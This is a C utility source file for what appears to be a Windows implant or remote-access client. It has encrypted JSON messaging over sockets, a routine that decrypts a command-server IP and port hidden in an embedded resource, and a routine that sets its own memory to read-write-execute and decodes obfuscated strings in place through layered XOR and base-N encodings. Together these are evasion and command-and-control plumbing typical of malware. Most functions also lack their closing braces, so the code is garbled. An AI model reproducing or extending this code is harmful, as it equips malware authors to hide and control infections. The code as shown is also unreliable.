#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <ctype.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) {
        return NULL;
    }
    char* out = (char*)malloc(out_len);
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;


unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        return NULL;
    }
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;


char* str_replace(const char* orig, const char* rep, const char* with) {
    char* result;
    char* ins;
    char* tmp;
    int len_rep;
    int len_with;
    int len_front;
    int count;

    if (!orig || !rep) return NULL;
    len_rep = strlen(rep);
    if (len_rep == 0) return NULL;
    if (!with) with = "";
    len_with = strlen(with);

    ins = (char*)orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }

    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result) return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig);
    return result;


void str_trim(char* s) {
    char* p = s;
    int l = strlen(p);
    while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
    while (*p && isspace(*p)) ++p, --l;
    memmove(s, p, l + 1);


extern SessionKey g_session;

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
    sock_send_ex(sock, mutex, "response", msg);


void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", type);
    cJSON_AddStringToObject(root, "payload", msg);
    char *json_msg = cJSON_PrintUnformatted(root);

    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);

    cJSON *packet = cJSON_CreateObject();
    cJSON_AddStringToObject(packet, "data", encrypted);

    char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
    cJSON_AddStringToObject(packet, "iv", iv_b64);

    char *final_json = cJSON_PrintUnformatted(packet);

    char *buf = (char*)malloc(strlen(final_json) + 2);
    sprintf(buf, "%s\n", final_json);
    send(sock, buf, (int)strlen(buf), 0);

    free(buf);
    free(final_json);
    free(iv_b64);
    free(encrypted);
    free(json_msg);
    cJSON_Delete(packet);
    cJSON_Delete(root);

    if (mutex) ReleaseMutex(mutex);


char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
    BYTE* pbKeyBlob = NULL;
    BYTE* pbEncrypted = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;

    // PEM -> DER (Wincrypt)
    DWORD derLen = 0;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
                // BCryptImportKeyPair might not like raw DER for RSA.
                // Alternatively use CryptImportPublicKeyInfo.
                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
            }
        }
        free(der);
    }

    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
    // let's use the older but reliable Crypt32 for RSA encryption or
    // convert DER to BCRYPT_RSAKEY_BLOB.

    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
    DWORD pubKeyInfoLen = 0;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hRSAKey = 0;

    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                    DWORD encLen = (DWORD)len;
                    // Get required size
                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                        BYTE* encBuf = malloc(encLen);

                        memcpy(encBuf, data, len);
                        DWORD dataLen = (DWORD)len;
                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                            // Reverse output for Big Endian compatibility with Go
                            for (DWORD i = 0; i < dataLen / 2; i++) {
                                BYTE temp = encBuf[i];
                                encBuf[i] = encBuf[dataLen - 1 - i];
                                encBuf[dataLen - 1 - i] = temp;
                            }
                            out = base64_encode(encBuf, dataLen, NULL);
                        }
                        free(encBuf);
                    }
                    CryptDestroyKey(hRSAKey);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(pubKeyInfo);
        }
        free(der);
    }

    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;


char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbCipherText = malloc(cbCipherText);
    memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    out = base64_encode(pbCipherText, cbResult, NULL);

cleanup:
    if (pbCipherText) free(pbCipherText);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;


unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
    size_t cipherLen = 0;

    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
    if (!pbCipher) return NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbPlain = malloc(cbPlain + 1); // +1 for null terminator
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    if (out_len) *out_len = cbResult;

cleanup:
    if (pbCipher) free(pbCipher);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pbPlain;


static int is_leap(unsigned long long y) {
    return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);


void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long minute = (secs % 3600) / 60;
    unsigned long long hour = (secs % 86400) / 3600;
    unsigned long long days = secs / 86400;
    unsigned long long year = 1970;
    while (1) {
        unsigned long long days_in_year = is_leap(year) ? 366 : 365;
        if (days < days_in_year) break;
        days -= days_in_year;
        year++;
    }
    unsigned long long months[] = {31, is_leap(year) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long month = 1;
    for (int i = 0; i < 12; i++) {
        if (days < months[i]) break;
        days -= months[i];
        month++;
    }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);


char g_host[256] = {0};
int g_port = 0;

unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};

// --- Base Decoders Implementation ---

static int b16_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return 0;


size_t base16_decode(const char* in, unsigned char* out) {
    size_t len = strlen(in);
    for (size_t i = 0; i < len / 2; i++) {
        out[i] = (b16_val(in[i * 2]) << 4) | b16_val(in[i * 2 + 1]);
    }
    return len / 2;


size_t base32_decode(const char* in, unsigned char* out) {
    const char* ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    int buffer = 0, bits = 0;
    size_t count = 0;
    for (size_t i = 0; in[i]; i++) {
        const char* p = strchr(ALPHABET, toupper(in[i]));
        if (!p) continue;
        buffer = (buffer << 5) | (p - ALPHABET);
        bits += 5;
        if (bits >= 8) {
            out[count++] = (buffer >> (bits - 8)) & 0xFF;
            bits -= 8;
        }
    }
    return count;


static const char* B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
size_t base58_decode(const char* in, unsigned char* out) {
    size_t out_len = 0;
    for (size_t i = 0; in[i]; i++) {
        const char* p = strchr(B58_ALPHABET, in[i]);
        if (!p) continue;
        int carry = p - B58_ALPHABET;
        for (size_t j = 0; j < out_len; j++) {
            carry += out[j] * 58;
            out[j] = carry & 0xFF;
            carry >>= 8;
        }
        while (carry) {
            out[out_len++] = carry & 0xFF;
            carry >>= 8;
        }
    }
    for (size_t i = 0; in[i] == '1'; i++) out[out_len++] = 0;
    // Reverse
    for (size_t i = 0; i < out_len / 2; i++) {
        unsigned char tmp = out[i];
        out[i] = out[out_len - 1 - i];
        out[out_len - 1 - i] = tmp;
    }
    return out_len;


static const char* B62_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
size_t base62_decode(const char* in, unsigned char* out) {
    size_t out_len = 0;
    for (size_t i = 0; in[i]; i++) {
        const char* p = strchr(B62_ALPHABET, in[i]);
        if (!p) continue;
        int carry = p - B62_ALPHABET;
        for (size_t j = 0; j < out_len; j++) {
            carry += out[j] * 62;
            out[j] = carry & 0xFF;
            carry >>= 8;
        }
        while (carry) {
            out[out_len++] = carry & 0xFF;
            carry >>= 8;
        }
    }
    // Reverse
    for (size_t i = 0; i < out_len / 2; i++) {
        unsigned char tmp = out[i];
        out[i] = out[out_len - 1 - i];
        out[out_len - 1 - i] = tmp;
    }
    return out_len;


size_t base85_decode(const char* in, unsigned char* out) {
    size_t out_len = 0;
    for (size_t i = 0; in[i]; ) {
        unsigned int val = 0;
        for (int j = 0; j < 5; j++) {
            val = val * 85 + (in[i++] - '!');
        }
        for (int j = 0; j < 4; j++) {
            out[out_len + 3 - j] = val & 0xFF;
            val >>= 8;
        }
        out_len += 4;
    }
    return out_len;


size_t base91_decode(const char* in, unsigned char* out) {
    const char* B91_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
    unsigned int v = -1, b = 0, count = 0;
    for (size_t i = 0; in[i]; i++) {
        const char* p = strchr(B91_ALPHABET, in[i]);
        if (!p) continue;
        if (v == -1) v = p - B91_ALPHABET;
        else {
            v += (p - B91_ALPHABET) * 91;
            b |= v << count;
            count += (v & 8191) > 88 ? 13 : 14;
            do {
                out[count / 8 - 1] = b & 0xFF;
                b >>= 8;
                count -= 8;
            } while (count >= 8);
            v = -1;
        }
    }
    return count / 8; // Simplified


void transparent_decryption() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
    // StringTableEntry: [RVA(4)][OrigLen(4)][EncodedLen(4)][StepCount(4)][Steps(16)]

    int num_strings = *(int*)(pData + 16 + 2032);
    if (num_strings <= 0) return;

    unsigned char* string_table = pData + 16 + 2032 + 4;
    unsigned char key = g_xor_key[4];
    if (key == 0) return;

    HMODULE hMod = GetModuleHandle(NULL);
    for (int i = 0; i < num_strings; i++) {
        unsigned char* entry = string_table + (i * 32);
        DWORD rva = *(DWORD*)(entry);
        DWORD orig_len = *(DWORD*)(entry + 4);
        DWORD enc_len = *(DWORD*)(entry + 8);
        int steps = *(int*)(entry + 12);
        unsigned char* step_types = entry + 16;

        if (rva == 0 || enc_len == 0 || enc_len > 8192) continue;

        unsigned char* addr = (unsigned char*)hMod + rva;

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                DWORD old_protect;
                if (VirtualProtect(addr, enc_len, PAGE_EXECUTE_READWRITE, &old_protect)) {

                    // Decrypt Steps (Reversed Order)
                    static unsigned char buf[8192];
                    memcpy(buf, addr, enc_len);
                    buf[enc_len] = 0;
                    size_t cur_len = enc_len;

                    for (int s = steps - 1; s >= 0; s--) {
                        unsigned char type = step_types[s];
                        static unsigned char tmp[8192];
                        memset(tmp, 0, 8192);

                        if (type == 0) { // XOR
                            for (size_t k = 0; k < cur_len; k++) buf[k] ^= key;
                        } else if (type == 1) { // B64
                            size_t out_l;
                            unsigned char* d = base64_decode((char*)buf, cur_len, &out_l);
                            if (d) { memcpy(buf, d, out_l); cur_len = out_l; free(d); }
                        } else if (type == 2) { // B32
                            cur_len = base32_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        } else if (type == 3) { // B16
                            cur_len = base16_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        } else if (type == 4) { // B58
                            cur_len = base58_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        } else if (type == 5) { // B62
                            cur_len = base62_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        } else if (type == 6) { // B85
                            cur_len = base85_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        } else if (type == 7) { // B91
                            cur_len = base91_decode((char*)buf, tmp);
                            memcpy(buf, tmp, cur_len);
                        }
                    }

                    // Restore original memory
                    memcpy(addr, buf, orig_len);
                    // Zero out the rest if encoded was longer
                    if (enc_len > orig_len) {
                        memset(addr + orig_len, 0, enc_len - orig_len);
                    }

                    VirtualProtect(addr, enc_len, old_protect, &old_protect);
                }
            }
        }
    }



void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    unsigned char* encrypted_config = pData + 16;
    size_t config_len = 2032;

    unsigned char key[32];
    unsigned char iv[16];
    memcpy(key, CONFIG_KEY, 32);
    memcpy(iv, CONFIG_IV, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    // Get plain text size
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
        // Fallback for no padding
        cbPlain = (DWORD)config_len;
    }

    pbPlain = malloc(cbPlain + 1);
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
        pbPlain[cbResult] = 0;
        cJSON* root = cJSON_Parse((char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip");
            cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
            if (port) g_port = port->valueint;
            cJSON_Delete(root);
        }
    }

cleanup:
    if (pbPlain) free(pbPlain);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

}
